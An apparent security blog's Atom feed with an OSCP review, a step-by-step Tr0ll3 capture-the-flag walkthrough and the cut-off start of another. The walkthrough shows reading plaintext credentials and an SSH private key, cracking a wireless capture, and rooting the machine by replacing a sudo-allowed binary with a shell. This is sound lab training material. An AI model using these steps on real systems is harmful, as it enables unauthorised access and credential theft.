<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Core dump overflow]]></title>
  <link href="http://chousensha.github.io/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2020-06-14T21:52:55+03:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[OSCP flash review]]></title>
    <link href="http://chousensha.github.io/blog/2020/06/14/oscp-flash-review/"/>
    <updated>2020-06-14T20:07:43+03:00</updated>
    <id>http://chousensha.github.io/blog/2020/06/14/oscp-flash-review</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve finished my OSCP shortly before <a href="https://www.offensive-security.com/pwk-oscp/">PWKv2</a> was released. Since my experience was pre-update, I didn&rsquo;t want to write a review that might no longer apply. Since then, I&rsquo;ve purchased the updated course materials, but I haven&rsquo;t yet gone back to do the newly added machines as well. I decided to write a quick review nonetheless, because I noticed a misconception about what the OSCP is. So I&rsquo;ll just address those points and not add just another OSCP review for the internet to swallow.</p>

<!-- more -->


<p>A quick rundown of my experience, I did all the lab machines and all the exam machines within 3 months. I plan to go back and also do the ones that were added by the update, but right now I am too busy with other things. After I do that, maybe I&rsquo;ll update this post or write a new one more focused on the impressions of the update. In terms of the new course materials, which I did review, there&rsquo;s a lot compared to the previous version. In particular, the new Windows section is superb and there are lots of usable snippets for various scenarios in modern environments.</p>

<p>Back to the reason for this post, it&rsquo;s not that I want to add just another post with what I did to prepare and the kind of information that is widely available already through the experiences of so many other successful takers (and you should read those posts and learn the most out of them to help you with your journey). My reason is that I noticed many people consider the OSCP the end all, be all of pentesting and are under the impression that it automatically makes you a pentesting god, while there are others who think it&rsquo;s overrated and that you don&rsquo;t learn much out of it. I consider both these opinion categories wrong. Let&rsquo;s dive in.</p>

<h3>My 50 cents about the OSCP</h3>

<p>After doing the OSCP and also moving beyond it, I consider it more like a necessary qualification to go through as a baseline for pentesting, much like the bootcamp in an army, training camp of a fight, or the qualifiers to a World Cup. It&rsquo;s hard and diverse enough, but it doesn&rsquo;t cover everything. It&rsquo;s mostly focused on network and web exploitation, along with enumeration and privilege escalation. Achieving it will demonstrate perseverance in front of obstacles, a working pentest methodology and skill, and a reasonable level of experience performing it. From that point, there&rsquo;s a lot on the horizon..going deeper in network and web attacks, exploit development, Active Directory..you realize when you&rsquo;re done that you just passed through a warpgate and now there&rsquo;s a whole lot of new challenges lining up. But the principles you learned through completing it will continue to be usable in your career and in future challenges.</p>

<h3>You get out what you put in</h3>

<p>I&rsquo;ve heard of several people who jumped into the exam after only going through a few machines in the labs. You are literally robbing yourself of the most valuable thing the OSCP provides. All the lab machines present a wide variety of operating systems (not just the usual flavors of Windows and Linux) and attack vectors. Some machines have different and unique vectors hidden in the attack surface that are way more rewarding than the obvious one. I don&rsquo;t think I used the same exploit more than 2 times in the lab. Each machine was a learning experience by itself. If you&rsquo;re running exploit suggester and throwing kernel exploits until one works, you&rsquo;re doing it wrong. Also, the hidden networks present a new challenge, in the way of pivoting, that needs to be solved before even reaching the targets. Not to mention the client side attacks and their difficulties.</p>

<p>Too many people are focusing just on the finality of earning a certification instead of squeezing the most out of all the labs have to offer. And even after you complete every box, don&rsquo;t imagine the exam won&rsquo;t be difficult. But you will be as prepared as you can get. Plus it&rsquo;s fun! If you don&rsquo;t get excited about the prospect of pwning over 50 boxes, why are you doing it in the first place? Your ROI will come from the effort you put into the labs, not from the letters you put on your resume.</p>

<h3>Outdated machines?</h3>

<p>Another thing I&rsquo;ve heard often is the complaint about lab machines being too outdated. Yes, the majority of boxes have older OS flavors..and that&rsquo;s a good thing! You can try your hand at exploits that will teach you things that you wouldn&rsquo;t otherwise experience in a completely modern environment. This is the foundation you are building, the training you&rsquo;re doing for match day. Plus, you learn to achieve objectives without your favorite tools. How do you transfer files to and from an older Windows machine without Powershell and all other native tools that you&rsquo;re used to? What can you do if you have RCE on a NIX system that&rsquo;s different than the ones you&rsquo;re familiar with? And many more wins that you arrive at from struggling with each challenge you&rsquo;re presented.</p>

<h3>Target audience</h3>

<p>Even with the new course update, which gives you a better starting point than before, I don&rsquo;t believe OSCP should be pursued for beginners. People who want to start in pentesting should first make sure they have their basics covered. Things like networking, system administration on Windows and Linux, programming, they are not basics as in easy and simple things, but as in the necessary foundation to add to with security. Trying to skip them won&rsquo;t end well. Once that is covered, there are lots of resources to prepare you, which I won&rsquo;t touch on here. VulnHub, HackTheBox, Ippsec, they have enough content to keep you busy for years. At some point, you have to dive in, but properly preparing for OSCP is as important an effort as working through it.</p>

<h3>Exam</h3>

<p>It&rsquo;s hard and it&rsquo;s fun. Don&rsquo;t think just because you finished all the lab machines it will be a walk in the park &ndash; it won&rsquo;t ;). But I do believe that doing all the machines is the best way to gauge your readiness for it.</p>

<p>Keeping it short and to the point I intended, these are my thoughts about the OSCP. It&rsquo;s an awesome training experience and challenge. You constantly switch back and forth between frustration and elation. And once you&rsquo;re on the other side..you don&rsquo;t stop there, but you go forward exploring all that new fog of war.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ You definitely intend to start living \
</span><span class='line'>\ sometime soon.                        /
</span><span class='line'>  -------------------------------------
</span><span class='line'>         \   ^__^ 
</span><span class='line'>          \  (oo)\_______
</span><span class='line'>             (__)\       )\/\
</span><span class='line'>                 ||----w |
</span><span class='line'>                 ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[There be Tr0lls - Part 3]]></title>
    <link href="http://chousensha.github.io/blog/2019/09/09/there-be-tr0lls-part-3/"/>
    <updated>2019-09-09T19:35:37+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/09/09/there-be-tr0lls-part-3</id>
    <content type="html"><![CDATA[<p>The Tr0ll is back with the 3rd machine in the series!</p>

<!-- more -->


<h2>start with credentials in plaintext</h2>

<p>The start is atypical..the machine only has the SSH port open, and in the author description we are told to <code>start:here</code> for the login..so let&rsquo;s try to SSH with these credentials. It works and we are in right away.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>start@Tr0ll3:~$ ls
</span><span class='line'>bluepill  redpill</span></code></pre></td></tr></table></div></figure>


<p>If you take the bluepill, you are being taught the secrets of how to make a hacker waste time.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>start@Tr0ll3:~/bluepill$ cat awesome_work
</span><span class='line'>http://bfy.tw/ODa</span></code></pre></td></tr></table></div></figure>


<p>With the redpill, we find a password..or we&rsquo;re being trolled:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>start@Tr0ll3:~/redpill$ cat this_will_surely_work
</span><span class='line'>step2:Password1!</span></code></pre></td></tr></table></div></figure>


<p>Jumping straight into enumeration with LinEnum, we notice there are many potentially interesting users on the system:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>maleus
</span><span class='line'>wytshadow
</span><span class='line'>genphlux
</span><span class='line'>eagle</span></code></pre></td></tr></table></div></figure>


<p>When searching for world writable files, we find the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-] Files not owned by user but writable by group:
</span><span class='line'>-rwxrwxrwx 1 root root 49962 Aug  2 00:23 /var/log/.dist-manage/wytshadow.cap
</span><span class='line'>-rwxrwxrwx 1 eagle russ 35737600 Aug  2 00:24 /.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt</span></code></pre></td></tr></table></div></figure>


<p>We also find possible credentials for the eagle user among the files owned by the start user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>start@Tr0ll3:~$ cat /home/start/.../about_time
</span><span class='line'>eagle:oxxwJo</span></code></pre></td></tr></table></div></figure>


<p>I transferred the capture file to my machine, also checked the contents of that troll file, it was filled with blocks of strings like these:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>QBu4rIhKXJ
</span><span class='line'>DKbpcZQpO3
</span><span class='line'>T7JUfO0jjZ</span></code></pre></td></tr></table></div></figure>


<p>Before looking at the exfiltrated file, I switched to the user eagle with the above password.</p>

<h2>Be the eagle &ndash; wireless traffic cracking</h2>

<p>The packet capture file contains wireless traffic, so I thought about cracking it with aircrack-ng. For the first attempt, I fed it the gold_star.txt file as wordlist, and it found the passphrase in 5 minutes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>aircrack-ng -w gold_star.txt wytshadow.cap
</span><span class='line'>[...]
</span><span class='line'>KEY FOUND! [ gaUoCe34t1 ]</span></code></pre></td></tr></table></div></figure>


<p>There was nothing particularly interesting from eagle&rsquo;s point of view, other than the sudo privilege for starting the vsftpd service:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User eagle may run the following commands on Tr0ll3:
</span><span class='line'>    (root) /usr/sbin/service vsftpd start</span></code></pre></td></tr></table></div></figure>


<p>We keep this option on the bench for now, since we have something else to work with. We know there&rsquo;s a wytshadow user, and the .cap file had the same name, so I used the key as password for this account and new user, new shell!</p>

<h2>wytshadow and the Lynx</h2>

<p>Inside the home directory we find a SUID executable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rwsrwxrwx  1 genphlux  root      8566 Jun 17  2015 oohfun
</span><span class='line'>wytshadow@Tr0ll3:~$ file oohfun
</span><span class='line'>oohfun: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=309f4fec949b0e2eb3f6ec83ccadff89c553e397, not stripped</span></code></pre></td></tr></table></div></figure>


<p>If we run it, we see the string &ldquo;iM Cr@zY L1k3 AAA LYNX&rdquo; printed continuously on the screen. If we look in the strings of the file, we see a reference to a shell script:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/lol/bin/run.sh -b 0.0.0.0</span></code></pre></td></tr></table></div></figure>


<p>If we look at that file, we see it does exactly what we saw earlier, printing the string in an infinite loop:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wytshadow@Tr0ll3:~$ cat /lol/bin/run.sh
</span><span class='line'>#!/bin/sh
</span><span class='line'>while true;do echo "iM Cr@zY L1k3 AAA LYNX"; done</span></code></pre></td></tr></table></div></figure>


<p>We don&rsquo;t have permissions to further enumerate the /lol directory. I checked the sudo privileges, and this user can start an Nginx server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User wytshadow may run the following commands on Tr0ll3:
</span><span class='line'>    (root) /usr/sbin/service nginx start</span></code></pre></td></tr></table></div></figure>


<p>The server is listening on port 8080, but we get a 403 Forbidden error when trying to access it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>roto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
</span><span class='line'>tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -</span></code></pre></td></tr></table></div></figure>


<p>If we look in the Nginx configuration files, we find the server expects a user agent of Lynx, and now it all makes sense. Lynx is a CLI browser.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wytshadow@Tr0ll3:~$ cat /etc/nginx/sites-available/default
</span><span class='line'>if ($http_user_agent !~ "Lynx*"){
</span><span class='line'>    return 403;</span></code></pre></td></tr></table></div></figure>


<p>I already had it on Kali, so I used it to browse to the newly opened web server and was handed the credentials for the genphlux user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>lynx http://192.168.159.143:8080/
</span><span class='line'>genphlux:HF9nd0cR!</span></code></pre></td></tr></table></div></figure>


<h2>genphlux &ndash; Unprotected SSH keys</h2>

<p>Inside the home directory we immediately find the SSH private key of the maleus user!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>genphlux@Tr0ll3:~$ cat maleus
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEowIBAAKCAQEAwz5Hwer48U1t/Qi9JveuO+Z7WQlnmhOOs/2pZ0he/OyVsEFv
</span><span class='line'>DsGib1wu/N8t+7h9JZK9x2GL33TXQBVCy6TxES90F1An+2DSza6lJPCyhcgK/DEp
</span><span class='line'>yxSVt32A+lFo+PQJV6QYZlpRkek0MjUw5y/E5qZwdBypC55C4QzgQBN3+Lnuhuk4
</span><span class='line'>u52xcK9/6/2N7JZCNYA21Tp1Uy9mty/65IT7OwKJd2rXp3O6rZYTD/vPl+Rt/LtN
</span><span class='line'>gA1DbDODq0NCmvcrZL+SafSj+MABA3LCERw01gA4RMdyxJU6hVfjeSKOdwDQOGWe
</span><span class='line'>eAVCL2GR/frwyf+rfN1kbpdw/RGXWWwVANMcaQIDAQABAoIBAGNudFztrZo2NK2I
</span><span class='line'>pcwSl0kqN+dAQuLU0vgXVw6ibL2iPxlkOYrqUi8kY0mk32YyrolUEhJYO0Ox3W1l
</span><span class='line'>Zn8PoTV/VUAKMlJzHOhi6PfHHSPEnNOSthYWhajM4cKZczxWC+v2RfbaSHBms45e
</span><span class='line'>SGl0inJskRiRAAZKswSp6gq334FrS6Dwy1tiKvzCfR3kLQghV5U/PhFZCsq3xvAw
</span><span class='line'>eXPx2toNtU2gYSGrKWTep+nAKM1neBxeZAujYuN4xJ5/Th2y0pyTvX9WEgzKPJ/G
</span><span class='line'>PlYZYCUAKPCbabYSuZckjeiN1aS52AIFedECBfAIezOr08Wx/bI/xCOgBxrQgPrK
</span><span class='line'>kRvlOYECgYEA5eCIEfdLhWdg3ltadYE0O5VAoXKrbxYWqSyw1Eyeqj0N1qD9Rsvg
</span><span class='line'>jIQJazV5JcVBIF54f/jlCJozR5s5AELrY0Z/krea1lF5ecOSUQE3tp94298xzO3g
</span><span class='line'>7BBe3g6pD56Cya/Vo0+YVQmAnBHLh6QIYvUUXXN2IyceT8fhEx5JA+sCgYEA2W4z
</span><span class='line'>KKMVAdPxKcjVks1zdGmVlj1RsUkakYuLWV3jQe2w1naJrc37Khy5eWZaRJhXqeBb
</span><span class='line'>1cvTMa+r/BF7jvItxglWoBJqXDxKI0a6KqWtloZL2ynoaBkAhR2btob6nSN63Bpg
</span><span class='line'>ZYJKY1B5yYbDHK4k6QT7atn2g6DAv/7sW6skj/sCgYA16WTAIek6TjZvr6kVacng
</span><span class='line'>N27C7mu6T8ncvzhxcc68SjlWnscHtYTiL40t8YqKCyrs9nr4OF0umUtxfbvujcM6
</span><span class='line'>syv0Ms9DeDQvFGjaSpjQYbIsjrnVP+zCMEyvc2y+1wQBXRWTiXVGbEYXVC0RkKzO
</span><span class='line'>2H+AMzX/pIr9Vvk4TJ//JQKBgFNJcy9NyO46UVbAJ49kQ6WEDFjQhEp0xkiaO3aw
</span><span class='line'>EC1g7yw3m+WH0X4AIsvt+QXtlSbtWkA7I1sU/7w+tiW7fu0tBpGqfDN4pK1+mjFb
</span><span class='line'>5XKTXttE4lF9wkU7Yjo42ib3QEivkd1QW05PtVcM2BBUZK8dyXDUrSkemrbw33j9
</span><span class='line'>xbOhAoGBAL8uHuAs68ki/BWcmWUUer7Y+77YI/FFm3EvP270K5yn0WUjDJXwHpuz
</span><span class='line'>Fg3n294GdjBtQmvyf2Wxin4rxl+1aWuj7/kS1/Fa35n8qCN+lkBzfNVA7f626KRA
</span><span class='line'>wS3CudSkma8StmvgGKIU5YcO8f13/3QB6PPBgNoKnF5BlFFQJqhK
</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>


<p>I was curious about what was inside /lol, it appears to be a JBoss installation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>genphlux@Tr0ll3:/lol$ ls
</span><span class='line'>bin  client  common  copyright.txt  docs  jar-versions.xml  JBossORG-EULA.txt  lgpl.html  lib  readme.html  server</span></code></pre></td></tr></table></div></figure>


<p>genphlux can also start an Apache server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User genphlux may run the following commands on Tr0ll3:
</span><span class='line'>(root) /usr/sbin/service apache2 start</span></code></pre></td></tr></table></div></figure>


<p>I started the server, also getting a 403 Forbidden, lynx or not. Moving on for now, I SSH&#8217;ed in as maleus with the found private key.</p>

<h2>maleus &ndash; don&rsquo;t even bother</h2>

<p>Inside his home we find another binary:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>maleus@Tr0ll3:~$ file dont_even_bother
</span><span class='line'>dont_even_bother: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=455a77b2503f19c1a09cbc9b66d513b2fa3af73c, not stripped</span></code></pre></td></tr></table></div></figure>


<p>This binary asks for a password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>maleus@Tr0ll3:~$ ./dont_even_bother
</span><span class='line'>
</span><span class='line'> Enter the password :
</span><span class='line'>das
</span><span class='line'>
</span><span class='line'> Wrong Password</span></code></pre></td></tr></table></div></figure>


<p>And in the strings we find a message for finding the correct password probably:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Your reward is just knowing you did it! :-P</span></code></pre></td></tr></table></div></figure>


<p>This reward isn&rsquo;t really that enticing, so I didn&rsquo;t jump into reversing this, it might be a troll dead end. I continued looking through the home folder and found a possible password inside the <em>.viminfo</em> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Registers:
</span><span class='line'>""1   LINE    0
</span><span class='line'> passwd
</span><span class='line'>"2    LINE    0
</span><span class='line'> B^slc8I$
</span><span class='line'>"3    LINE    0
</span><span class='line'> passswd</span></code></pre></td></tr></table></div></figure>


<p>In the .viminfo file you can find information that persists throughout vim runs. If you don&rsquo;t disable the vim logging, you can expect to find things you typed / pasted / edited, like passwords in this case. A useful blog that describes this in more detail is <a href="http://technotes.whw1.com/computer-related/development/programming/58-how-to-stop-vim-logging-info-into-viminfo">http://technotes.whw1.com/computer-related/development/programming/58-how-to-stop-vim-logging-info-into-viminfo</a></p>

<p>The password belongs to maleus and now we can check his sudo privileges. We find out he can run the executable from earlier as root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User maleus may run the following commands on Tr0ll3:
</span><span class='line'>    (root) /home/maleus/dont_even_bother</span></code></pre></td></tr></table></div></figure>


<p>From the strings, we already assume the executable itself is just a troll. However, maleus has write privileges over this file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>maleus@Tr0ll3:~$ ls -l
</span><span class='line'>total 12
</span><span class='line'>-rwxrwxr-x 1 maleus maleus 8674 Jun 18  2015 dont_even_bother</span></code></pre></td></tr></table></div></figure>


<p>So we can just replace this useless binary with one that would give us a root shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>maleus@Tr0ll3:~$ cat /bin/sh &gt; dont_even_bother
</span><span class='line'>maleus@Tr0ll3:~$ sudo ./dont_even_bother
</span><span class='line'>[sudo] password for maleus:
</span><span class='line'># cat /root/flag.txt
</span><span class='line'>You are truly a Jedi!
</span><span class='line'>
</span><span class='line'>Twitter Proof:
</span><span class='line'>
</span><span class='line'>Pr00fThatTh3L33tHax0rG0tTheFl@g!!
</span><span class='line'>
</span><span class='line'>@Maleus21</span></code></pre></td></tr></table></div></figure>


<p>This was another fun machine in the series. In the end, we trolled the troll again!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ QOTD:                                  \
</span><span class='line'>|                                        |
</span><span class='line'>\ All I want is more than my fair share. /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[No Mercy]]></title>
    <link href="http://chousensha.github.io/blog/2019/06/09/no-mercy/"/>
    <updated>2019-06-09T21:43:54+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/06/09/no-mercy</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is inspired from the OSCP labs!</p>

<!-- more -->


<p>There are quite a few ports open, and some filtered:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE    SERVICE     VERSION
</span><span class='line'>22/tcp   filtered ssh
</span><span class='line'>53/tcp   open     domain      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
</span><span class='line'>| dns-nsid:
</span><span class='line'>|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
</span><span class='line'>80/tcp   filtered http
</span><span class='line'>110/tcp  open     pop3        Dovecot pop3d
</span><span class='line'>|_pop3-capabilities: SASL PIPELINING CAPA TOP UIDL AUTH-RESP-CODE STLS RESP-CODES
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span><span class='line'>143/tcp  open     imap        Dovecot imapd (Ubuntu)
</span><span class='line'>|_imap-capabilities: STARTTLS more have IMAP4rev1 post-login ID listed SASL-IR LOGINDISABLEDA0001 ENABLE LITERAL+ capabilities LOGIN-REFERRALS IDLE Pre-login OK
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
</span><span class='line'>993/tcp  open     ssl/imaps?
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>995/tcp  open     ssl/pop3s?
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>8080/tcp open     http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>| http-methods:
</span><span class='line'>|_  Potentially risky methods: PUT DELETE
</span><span class='line'>|_http-open-proxy: Proxy might be redirecting requests
</span><span class='line'>| http-robots.txt: 1 disallowed entry
</span><span class='line'>|_/tryharder/tryharder
</span><span class='line'>|_http-server-header: Apache-Coyote/1.1
</span><span class='line'>|_http-title: Apache Tomcat</span></code></pre></td></tr></table></div></figure>


<p>The available web server is a Tomcat installation. In the <a href="http://192.168.159.137:8080/tryharder/tryharder">http://192.168.159.137:8080/tryharder/tryharder</a> we find a base64 string:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
